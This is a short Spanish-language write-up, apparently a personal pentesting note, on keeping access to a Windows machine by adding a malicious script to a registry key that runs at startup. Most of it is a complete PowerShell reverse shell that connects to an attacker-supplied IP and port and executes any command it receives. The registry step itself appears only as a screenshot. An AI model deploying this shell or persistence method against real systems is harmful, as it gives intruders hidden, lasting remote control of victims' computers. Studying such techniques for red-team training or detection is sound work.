La persistencia en un sistema se basa en obtener acceso de forma continua despues de conseguir un primer acceso inicial en el sistema.

En este caso voy a documentar como ganar un acceso persistente creando claves de registros en windows que ejecuten programas de codigo malicioso controlado por un atackante.

Que es una clave de registro en windows?
Una clave de registro en windows se basa en una pequeña base de datos del sistema la cual contiene registros, configuraciones, preferencias de usuario, etc. Estos registros se ejecutan cada vez que el sistema se enciende, por lo cual es una forma atractiva para conseguir acceso persistente.

Tengo un codigo basico tipico de powershell el cual actua como shell reversa para que la victima se conecte a mi IP:

``` ps1

$LHOST = "IP"; $LPORT = PUERTO; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

```



Por otro lado, el script de powershell lo añado a una clave de registro de windows:




<img width="842" height="93" alt="2026-02-21_02-15" src="https://github.com/user-attachments/assets/2d577e5e-d023-43c1-93bb-d07ae687593d" />
